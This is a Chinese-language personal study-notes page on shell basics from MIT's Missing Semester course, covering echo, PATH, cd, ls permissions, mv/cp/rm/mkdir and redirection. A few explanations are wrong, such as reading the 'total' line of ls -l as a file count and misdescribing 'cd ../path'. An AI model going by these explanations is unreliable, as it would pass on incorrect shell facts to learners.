<p>课程链接：<a href="https://missing.csail.mit.edu/">The Missing Semester</a></p>
<p>虽然对于命令行等工具已经有过基本的使用，但是相信系统化的学习之后，会有更大的收获。</p>
<blockquote>
<p>本次学习跳过了 Git 和 Vim 部分，因为本人目前更加倾向于使用 VSCode，Vim 只了解了基本操作已经足够. Git 笔记见 <a href="#note-cs-git">Git</a>。</p>
</blockquote>
<h2 id="note-cs-tms-_1">目录<a class="headerlink" href="#note-cs-tms-_1" title="Permanent link">&para;</a></h2>
<ul class="task-list">
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-cs-tms-overview-and-shell">概览与shell</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-cs-tms-shell-tools-and-scripts">shell工具与脚本</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-cs-tms-data-wrangling">数据整理</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-cs-tms-command-line-environment">命令行环境</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> <a href="#note-cs-tms-debugging-and-profiling">调试与性能分析</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> <a href="#note-cs-tms-metaprogramming">元编程</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> <a href="#note-cs-tms-security-and-cryptography">安全和密码学</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> <a href="#note-cs-tms-miscellaneous">大杂烩</a></li>
</ul></section><section class="print-page" id="note-cs-tms-overview-and-shell" heading-number="2.4.2.2"><h1 id="note-cs-tms-overview-and-shell-overview-and-shell">Overview and Shell<a class="headerlink" href="#note-cs-tms-overview-and-shell-overview-and-shell" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 4604 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 111 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 3 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 17 分钟</p>
</div>
<div class="admonition info">
<p class="admonition-title">什么是终端和shell</p>
<p>终端（Terminal）是用户与计算机系统交互的界面。它可以是一个物理设备，如早期的计算机终端，也可以是一个软件应用程序，如现代操作系统中的终端仿真器。通过终端，用户可以输入命令并查看计算机的输出。终端通常用于执行命令行操作，进行文件管理、系统配置和程序运行等任务。</p>
<p>Shell 是一种命令行解释器，它提供了一个用户与操作系统内核交互的界面。用户在终端中输入的命令会被 Shell 解释并传递给操作系统执行。Shell 还提供了编程功能，如变量、控制结构和脚本编写，使用户能够编写复杂的自动化任务。</p>
<p>常见的 Shell 包括：</p>
<ul>
<li>Bash（Bourne Again Shell）：大多数 Linux 发行版的默认 Shell。</li>
<li>Zsh（Z Shell）：功能强大且可定制的 Shell，近年来越来越受欢迎。</li>
<li>Fish（Friendly Interactive Shell）：用户友好的 Shell，提供了许多现代特性。</li>
</ul>
<p>Shell 是用户与操作系统之间的重要桥梁，通过它，用户可以高效地管理和控制计算机系统。</p>
</div>
<p>如果某些命令不记得了，可以使用<code>man</code>命令查看帮助文档，或者安装<code>tldr</code>命令查看简化的帮助文档</p>
<h2 id="note-cs-tms-overview-and-shell-echo">echo 命令<a class="headerlink" href="#note-cs-tms-overview-and-shell-echo" title="Permanent link">&para;</a></h2>
<p><code>echo</code> 命令用于在终端中显示一段文本或变量的值。它是一个非常基础且常用的命令，常用于脚本编写和调试。</p>
<p>基本语法：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-cs-tms-overview-and-shell-__codelineno-0-1"></a><span class="nb">echo</span><span class="w"> </span><span class="o">[</span>选项<span class="o">]</span><span class="w"> </span><span class="o">[</span>字符串<span class="o">]</span>
</span></code></pre></div></p>
<p>常用选项：
- <code>-n</code>：不在输出的末尾添加换行符。
- <code>-e</code>：启用反斜杠转义字符的解释。</p>
<p>示例：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-cs-tms-overview-and-shell-__codelineno-1-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Hello, World!&quot;</span>
</span></code></pre></div></p>
<p>输出：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-cs-tms-overview-and-shell-__codelineno-2-1"></a>Hello,<span class="w"> </span>World!
</span></code></pre></div></p>
<p>使用 <code>-n</code> 选项：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-cs-tms-overview-and-shell-__codelineno-3-1"></a><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;Hello, World!&quot;</span>
</span></code></pre></div></p>
<p>输出：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#note-cs-tms-overview-and-shell-__codelineno-4-1"></a>Hello,<span class="w"> </span>World!（没有换行）
</span></code></pre></div></p>
<p>使用 <code>-e</code> 选项：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#note-cs-tms-overview-and-shell-__codelineno-5-1"></a><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;Hello,\nWorld!&quot;</span>
</span></code></pre></div></p>
<p>输出：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#note-cs-tms-overview-and-shell-__codelineno-6-1"></a>Hello,
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#note-cs-tms-overview-and-shell-__codelineno-6-2"></a>World!
</span></code></pre></div></p>
<p>参数之间使用空格分开</p>
<h2 id="note-cs-tms-overview-and-shell-path">环境变量(PATH)<a class="headerlink" href="#note-cs-tms-overview-and-shell-path" title="Permanent link">&para;</a></h2>
<p>环境变量是操作系统中用于存储系统设置和配置信息的变量。它们在操作系统和应用程序之间传递信息，控制程序的行为和运行环境。环境变量通常以键值对的形式存在，每个变量都有一个名称和一个对应的值。</p>
<p>更通俗的说，当我们在终端里面输入命令时, 操作系统会根据 <code>PATH</code> 变量中定义的目录顺序搜索该命令对应的可执行文件，如果可以找到，则执行该文件。</p>
<p>要想输出自己的环境变量，可以使用 <code>echo</code> 命令，例如：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#note-cs-tms-overview-and-shell-__codelineno-7-1"></a><span class="nb">echo</span><span class="w"> </span><span class="nv">$PATH</span>
</span></code></pre></div></p>
<p>会返回绝对路径</p>
<details class="question">
<summary>路径</summary>
<p>绝对路径就是完全确定文件位置的路径</p>
<p>相对路径是相对于当前工作目录的路径</p>
<p><code>.</code> 表示当前目录</p>
<p><code>..</code> 表示上一级目录</p>
<p><code>~</code> 表示当前用户的主目录</p>
<p>输入 <code>pwd</code> 可以查看当前工作目录</p>
<p>输入 <code>ls</code> 可以查看当前目录下的文件</p>
<p>输入 <code>cd</code> 可以切换目录(<code>cd 目录名</code>)</p>
</details>
<p>在Linux中，路径通常以 <code>/</code> 开头，表示根目录。</p>
<p>在windows中，路径通常以 <code>盘符:\</code> 开头。</p>
<p>因为在windows中每一个盘都代表一个文件系统，所以我们经常会看到 <code>C:\</code> 这样的路径。\</p>
<p>例如</p>
<pre class="mermaid"><code>graph TD;
    C("C:\\") --&gt; ProgramFiles("C:\\Program Files");
    C("C:\\") --&gt; Users("C:\\Users");
    C("C:\\") --&gt; Windows("C:\\Windows");
    D("D:\\") --&gt; Documents("D:\\Documents");
    D("D:\\") --&gt; Downloads("D:\\Downloads");
    E("E:\\") --&gt; Music("E:\\Music");
    E("E:\\") --&gt; Videos("E:\\Videos");
    F("F:\\") --&gt; Backup("F:\\Backup");
    F("F:\\") --&gt; Projects("F:\\Projects");</code></pre>
<p>而在Linux中，文件结构是树状的，所以路径通常以 <code>/</code> 开头，表示根目录。</p>
<pre class="mermaid"><code>graph TD;
    root("/") --&gt; bin("/bin");
    root("/") --&gt; boot("/boot");
    root("/") --&gt; dev("/dev");
    root("/") --&gt; etc("/etc");
    root("/") --&gt; home("/home");
    root("/") --&gt; lib("/lib");
    root("/") --&gt; media("/media");
    root("/") --&gt; mnt("/mnt");
    root("/") --&gt; opt("/opt");
    root("/") --&gt; proc("/proc");
    root("/") --&gt; run("/run");
    root("/") --&gt; sbin("/sbin");
    root("/") --&gt; srv("/srv");
    root("/") --&gt; sys("/sys");
    root("/") --&gt; tmp("/tmp");
    root("/") --&gt; usr("/usr");
    root("/") --&gt; var("/var");</code></pre>
<p>如果想知道某条命令具体在哪个目录下，可以使用 <code>which</code> 命令，例如：
<div class="language-zsh highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#note-cs-tms-overview-and-shell-__codelineno-8-1"></a>which<span class="w"> </span><span class="nb">cd</span>
</span></code></pre></div>
会返回
<div class="language-zsh highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#note-cs-tms-overview-and-shell-__codelineno-9-1"></a>cd:<span class="w"> </span>shell<span class="w"> </span>built-in<span class="w"> </span><span class="nb">command</span>
</span></code></pre></div></p>
<h2 id="note-cs-tms-overview-and-shell-cd">cd<a class="headerlink" href="#note-cs-tms-overview-and-shell-cd" title="Permanent link">&para;</a></h2>
<p><code>cd</code> 命令是一个用于在终端中更改当前工作目录的命令。它是 "change directory" 的缩写。使用 <code>cd</code> 命令，用户可以在文件系统中导航到不同的目录。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#note-cs-tms-overview-and-shell-__codelineno-10-1"></a><span class="nb">cd</span><span class="w"> </span><span class="o">[</span>目录路径<span class="o">]</span>
</span></code></pre></div>
<ul>
<li>如果不带参数，<code>cd</code> 会将当前目录更改为用户的主目录。</li>
<li>使用 <code>cd ..</code> 可以返回到上一级目录。</li>
<li>使用 <code>cd -</code> 可以返回到上一个工作目录。</li>
</ul>
<p>一些常见的用法有</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#note-cs-tms-overview-and-shell-__codelineno-11-1"></a><span class="nb">cd</span><span class="w"> </span>/path/to/directory
</span></code></pre></div>
<p>这将把当前工作目录更改为 <code>/path/to/directory</code>。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#note-cs-tms-overview-and-shell-__codelineno-12-1"></a><span class="nb">cd</span><span class="w"> </span>../path/to/directory
</span></code></pre></div>
<p>这将把当前工作目录更改为上一级目录的上一级目录的指定目录。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#note-cs-tms-overview-and-shell-__codelineno-13-1"></a><span class="nb">cd</span><span class="w"> </span>./path
</span></code></pre></div>
<p>这将把当前工作目录更改为当前目录的指定目录</p>
<ul>
<li>路径可以是绝对路径或相对路径。</li>
<li>在 Linux 和 macOS 中，路径区分大小写。</li>
<li>使用 <code>pwd</code> 命令可以查看当前工作目录。</li>
</ul>
<p>通过 <code>cd</code> 命令，用户可以方便地在文件系统中导航，执行文件管理和其他操作。</p>
<h2 id="note-cs-tms-overview-and-shell-ls">ls<a class="headerlink" href="#note-cs-tms-overview-and-shell-ls" title="Permanent link">&para;</a></h2>
<p><code>ls</code> 命令是一个用于列出目录内容的命令。它是 "list" 的缩写。使用 <code>ls</code> 命令，用户可以查看指定目录下的文件和子目录。</p>
<details class="question">
<summary>folder vs directory</summary>
<p>directory 是目录, 是文件系统中的一个概念, 而 folder 是文件夹, 是图形化界面中的一个概念，folder 不一定是directory，除非它存在于文件系统中，directory 也不一定显示为是 folder，只有它在GUI环境下才是</p>
</details>
<p>使用<code>ls --help</code>可以查看<code>ls</code>命令的帮助文档</p>
<p>常用的参数有</p>
<p><code>-a</code>：显示所有文件和目录，包括隐藏文件（以<code>.</code>开头的文件,即隐藏文件 ）。</p>
<p><code>-l</code>：以长格式显示文件和目录。
例如在本人的<code>~</code>目录下输入<code>ls -l</code>会返回
<div class="language-zsh highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#note-cs-tms-overview-and-shell-__codelineno-14-1"></a>total<span class="w"> </span><span class="m">15596</span>
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#note-cs-tms-overview-and-shell-__codelineno-14-2"></a>
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#note-cs-tms-overview-and-shell-__codelineno-14-3"></a>-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>kailoveq<span class="w"> </span>kailoveq<span class="w">      </span><span class="m">787</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">24</span><span class="w">  </span><span class="m">2023</span><span class="w"> </span><span class="m">1</span>.txt
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#note-cs-tms-overview-and-shell-__codelineno-14-4"></a>-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>kailoveq<span class="w"> </span>kailoveq<span class="w">      </span><span class="m">334</span><span class="w"> </span>Jul<span class="w">  </span><span class="m">4</span><span class="w">  </span><span class="m">2024</span><span class="w"> </span>Kailqq.txt
</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#note-cs-tms-overview-and-shell-__codelineno-14-5"></a>drwxr-xr-x<span class="w">  </span><span class="m">3</span><span class="w"> </span>kailoveq<span class="w"> </span>kailoveq<span class="w">     </span><span class="m">4096</span><span class="w"> </span>Sep<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">11</span>:07<span class="w"> </span>MASM
</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#note-cs-tms-overview-and-shell-__codelineno-14-6"></a>drwxr-xr-x<span class="w">  </span><span class="m">7</span><span class="w"> </span>kailoveq<span class="w"> </span>kailoveq<span class="w">     </span><span class="m">4096</span><span class="w"> </span>Feb<span class="w"> </span><span class="m">27</span><span class="w">  </span><span class="m">2024</span><span class="w"> </span>autojump
</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#note-cs-tms-overview-and-shell-__codelineno-14-7"></a>-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>kailoveq<span class="w"> </span>kailoveq<span class="w">  </span><span class="m">2634817</span><span class="w"> </span>Feb<span class="w">  </span><span class="m">2</span><span class="w">  </span><span class="m">2024</span><span class="w"> </span>get-pip.py
</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#note-cs-tms-overview-and-shell-__codelineno-14-8"></a>-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>kailoveq<span class="w"> </span>kailoveq<span class="w">     </span><span class="m">6140</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">12</span><span class="w">  </span><span class="m">2015</span><span class="w"> </span>mysql-community-release-el7-5.noarch.rpm
</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#note-cs-tms-overview-and-shell-__codelineno-14-9"></a>drwxr-xr-x<span class="w"> </span><span class="m">10</span><span class="w"> </span>kailoveq<span class="w"> </span>kailoveq<span class="w">     </span><span class="m">4096</span><span class="w"> </span>Jan<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">23</span>:54<span class="w"> </span>node_modules
</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#note-cs-tms-overview-and-shell-__codelineno-14-10"></a>drwxr-xr-x<span class="w">  </span><span class="m">2</span><span class="w"> </span>kailoveq<span class="w"> </span>kailoveq<span class="w">     </span><span class="m">4096</span><span class="w"> </span>Jan<span class="w"> </span><span class="m">21</span><span class="w">  </span><span class="m">2024</span><span class="w"> </span>ok
</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#note-cs-tms-overview-and-shell-__codelineno-14-11"></a>-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>kailoveq<span class="w"> </span>kailoveq<span class="w">     </span><span class="m">3843</span><span class="w"> </span>Jan<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">23</span>:58<span class="w"> </span>package-lock.json
</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#note-cs-tms-overview-and-shell-__codelineno-14-12"></a>-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>kailoveq<span class="w"> </span>kailoveq<span class="w">      </span><span class="m">152</span><span class="w"> </span>Jan<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">23</span>:58<span class="w"> </span>package.json
</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#note-cs-tms-overview-and-shell-__codelineno-14-13"></a>-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>kailoveq<span class="w"> </span>kailoveq<span class="w">        </span><span class="m">0</span><span class="w"> </span>Feb<span class="w"> </span><span class="m">20</span><span class="w">  </span><span class="m">2024</span><span class="w"> </span>selected
</span><span id="__span-14-14"><a id="__codelineno-14-14" name="__codelineno-14-14" href="#note-cs-tms-overview-and-shell-__codelineno-14-14"></a>drwx------<span class="w">  </span><span class="m">4</span><span class="w"> </span>kailoveq<span class="w"> </span>kailoveq<span class="w">     </span><span class="m">4096</span><span class="w"> </span>Jan<span class="w"> </span><span class="m">24</span><span class="w"> </span><span class="m">14</span>:25<span class="w"> </span>snap
</span><span id="__span-14-15"><a id="__codelineno-14-15" name="__codelineno-14-15" href="#note-cs-tms-overview-and-shell-__codelineno-14-15"></a>drwxr-xr-x<span class="w">  </span><span class="m">4</span><span class="w"> </span>kailoveq<span class="w"> </span>kailoveq<span class="w">     </span><span class="m">4096</span><span class="w"> </span>May<span class="w"> </span><span class="m">18</span><span class="w">  </span><span class="m">2024</span><span class="w"> </span>texmf
</span></code></pre></div>
首先看<code>total 15596</code>，表示该目录下有15596个文件和子目录。</p>
<p>然后看包含<code>-</code>的行，如果前面有<code>d</code>，表示该文件是一个目录，如果前面是<code>-</code>，表示这是一个文件</p>
<p>除第一个外，还剩下九个位置,每三个位置为一组，分别表示对应的权限</p>
<p>前三位表示文件所有者的权限，中间三位表示文件所有者所在组的权限，最后三位表示其他人的权限</p>
<p>例如对于<code>texmf</code>,前三位为<code>rwx</code>，表示文件所有者有读、写、执行的权限，中间三位为<code>r-x</code>，表示文件所有者所在组有读、执行的权限，最后三位为<code>r-x</code>，表示其他人有读、执行的权限</p>
<p>目前而言,在我的<code>home</code>目录下,所有者和组都是<code>kailoveq</code></p>
<p>如果对于文件而言</p>
<ul>
<li><code>r</code>表示可读文件的内容</li>
<li><code>w</code>表示可对文件进行修改</li>
<li><code>x</code>表示可以执行文件</li>
</ul>
<p>如果对于目录而言
- <code>r</code>表示可以读取目录中的文件列表
- <code>w</code>表示是否可以对目录中的文件进行重命名或者删除,这说明,如果有对于目录内文件的<code>w</code>权限,但是没有对于目录的<code>w</code>权限,那么不能删除目录内的文件,仅仅可以清空目录
- <code>x</code>表示是否可以进入目录</p>
<h2 id="note-cs-tms-overview-and-shell-rename-move-and-delete">rename move and delete<a class="headerlink" href="#note-cs-tms-overview-and-shell-rename-move-and-delete" title="Permanent link">&para;</a></h2>
<p><code>mv</code>命令用于移动文件或目录，也可以用于重命名文件或目录。</p>
<p><code>cp</code>命令用于复制文件或目录。</p>
<p><code>mv</code>命令的基本语法是</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#note-cs-tms-overview-and-shell-__codelineno-15-1"></a>mv<span class="w"> </span><span class="o">[</span>选项<span class="o">]</span><span class="w"> </span>源文件<span class="w"> </span>目标文件/目录
</span></code></pre></div>
<p><code>cp</code>命令的基本语法是</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#note-cs-tms-overview-and-shell-__codelineno-16-1"></a>cp<span class="w"> </span><span class="o">[</span>选项<span class="o">]</span><span class="w"> </span>源文件<span class="w"> </span>目标文件/目录
</span></code></pre></div>
<p>例如我想要将<code>1.txt</code>重命名为<code>2.txt</code>，那么我可以在终端中输入</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#note-cs-tms-overview-and-shell-__codelineno-17-1"></a>mv<span class="w"> </span><span class="m">1</span>.txt<span class="w"> </span><span class="m">2</span>.txt
</span></code></pre></div>
<p>然后我想要将它移动<code>./dir1</code>目录下，那么我可以在终端中输入</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#note-cs-tms-overview-and-shell-__codelineno-18-1"></a>mv<span class="w"> </span><span class="m">2</span>.txt<span class="w"> </span>./dir1
</span></code></pre></div>
<p>这会在<code>./dir1</code>目录下创建一个<code>2.txt</code>文件，并且将原本的<code>2.txt</code>删除，其内容会移动到<code>./dir1</code>目录下</p>
<p>其效果等同于</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#note-cs-tms-overview-and-shell-__codelineno-19-1"></a>cp<span class="w"> </span><span class="m">2</span>.txt<span class="w"> </span>./dir1
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#note-cs-tms-overview-and-shell-__codelineno-19-2"></a>rm<span class="w"> </span><span class="m">2</span>.txt
</span></code></pre></div>
<p><code>rm</code>命令用于删除文件或目录,它并不支持递归删除,所以如果想要删除目录,需要使用<code>-r</code>选项</p>
<p>删除文件时</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#note-cs-tms-overview-and-shell-__codelineno-20-1"></a>rm<span class="w"> </span><span class="m">1</span>.txt
</span></code></pre></div>
<p>删除目录时</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#note-cs-tms-overview-and-shell-__codelineno-21-1"></a>rm<span class="w"> </span>-r<span class="w"> </span>./dir1
</span></code></pre></div>
<p>或者当目录为空时,可以使用<code>rmdir</code>命令</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#note-cs-tms-overview-and-shell-__codelineno-22-1"></a>rmdir<span class="w"> </span>./dir1
</span></code></pre></div>
<p>如果加上参数<code>-f</code>选项表示强制删除.</p>
<div class="admonition note">
<p class="admonition-title">创建目录</p>
<p>创建目录时,可以使用<code>mkdir</code>命令</p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#note-cs-tms-overview-and-shell-__codelineno-23-1"></a>mkdir<span class="w"> </span>dir1<span class="w"> </span>
</span></code></pre></div>
会在当前目录下创建一个名为<code>dir1</code>的目录</p>
<p><div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#note-cs-tms-overview-and-shell-__codelineno-24-1"></a>mkdir my photo
</span></code></pre></div>
会在当前目录下创建一个名为<code>my</code>的目录和一个名为<code>photo</code>的目录</p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#note-cs-tms-overview-and-shell-__codelineno-25-1"></a>mkdir<span class="w"> </span>my<span class="se">\ </span>photo
</span></code></pre></div>
会在当前目录下创建一个名为<code>my photo</code>的目录,使用<code>\</code>来转义空格,也可以<code>mkdir "my photo"</code>来实现同样的效果</p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#note-cs-tms-overview-and-shell-__codelineno-26-1"></a>mkdir<span class="w">  </span>dir1/dir2/dir3
</span></code></pre></div>
会在进入到<code>dir1/dir2</code>目录后,创建一个名为<code>dir3</code>的目录</p>
<p>如果想要创建多级目录,可以使用<code>mkdir -p</code>命令</p>
<p><div class="language-zsh highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#note-cs-tms-overview-and-shell-__codelineno-27-1"></a>mkdir<span class="w"> </span>-p<span class="w"> </span>dir1/dir2/dir3
</span></code></pre></div>
会在当前目录下创建一个名为<code>dir1</code>的目录,然后进入<code>dir1</code>目录,创建一个名为<code>dir2</code>的目录,然后进入<code>dir2</code>目录,创建一个名为<code>dir3</code>的目录</p>
</div>
<blockquote>
<p>Tips:如果你的终端这时候已经很多东西了,可以使用<code>Ctrl+L</code>或者<code>clear</code>来清屏</p>
</blockquote>
<h2 id="note-cs-tms-overview-and-shell-_1">重定向<a class="headerlink" href="#note-cs-tms-overview-and-shell-_1" title="Permanent link">&para;</a></h2>
<p>在 shell 中，程序有两个主要的“流”：它们的输入流和输出流。 当程序尝试读取信息时，它们会从输入流中进行读取，当程序打印信息时，它们会将信息输出到输出流中。 通常，一个程序的输入输出流都是您的终端。也就是，您的键盘作为输入，显示器作为输出。 但是，我们也可以重定向这些流。</p>
<p>最基本的有两个</p>
<p><code>&gt;</code> 表示输出重定向，将命令的输出结果重定向到指定文件中。</p>
<p><code>&lt;</code> 表示输入重定向，将指定文件作为命令的输入。</p>
<p>例如</p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#note-cs-tms-overview-and-shell-__codelineno-28-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Hello, World!&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>output.txt
</span></code></pre></div>
这会创建一个名为<code>output.txt</code>的文件,并将其内容设置为<code>Hello, World!</code></p>
<p>如果使用<code>cat</code>命令查看<code>output.txt</code>文件的内容,<code>cat output.txt</code>会返回</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#note-cs-tms-overview-and-shell-__codelineno-29-1"></a>Hello,<span class="w"> </span>World!
</span></code></pre></div>
<p>我们也可以将<code>output.txt</code>文件的内容重定向到<code>input.txt</code>文件中</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#note-cs-tms-overview-and-shell-__codelineno-30-1"></a>cat<span class="w"> </span>output.txt<span class="w"> </span>&gt;<span class="w"> </span>input.txt
</span></code></pre></div>
